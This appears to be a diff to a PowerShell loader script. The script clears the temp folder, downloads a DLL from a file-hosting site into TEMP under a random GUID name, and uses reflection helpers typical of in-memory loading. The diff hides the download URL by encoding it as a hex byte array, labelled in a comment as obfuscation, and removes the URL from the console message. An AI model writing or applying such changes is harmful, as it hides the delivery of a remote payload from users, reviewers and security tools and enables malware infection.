@@ -61,6 +61,9 @@ function getDelegateType {
     ).SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
+# === Hidden DLL URL (Obfuscated as Hex Byte Array) ===
+$dllUrl = [Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x69,0x6c,0x65,0x73,0x2e,0x63,0x61,0x74,0x62,0x6f,0x78,0x2e,0x6d,0x6f,0x65,0x2f,0x31,0x77,0x6c,0x76,0x71,0x63,0x2e,0x64,0x6c,0x6c))
+
 # === 1. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
@@ -75,10 +78,9 @@ catch {
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllFileName = "$randomGuid.dll"
 $dllPath = Join-Path $env:TEMP $dllFileName
-$dllUrl = "https://files.catbox.moe/1wlvqc.dll"
 
 try {
-    Write-Host "[+] Downloading DLL from: $dllUrl" -ForegroundColor Cyan
+    Write-Host "[+] Downloading DLL..." -ForegroundColor Cyan
     Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
     
     $webClient = New-Object System.Net.WebClient
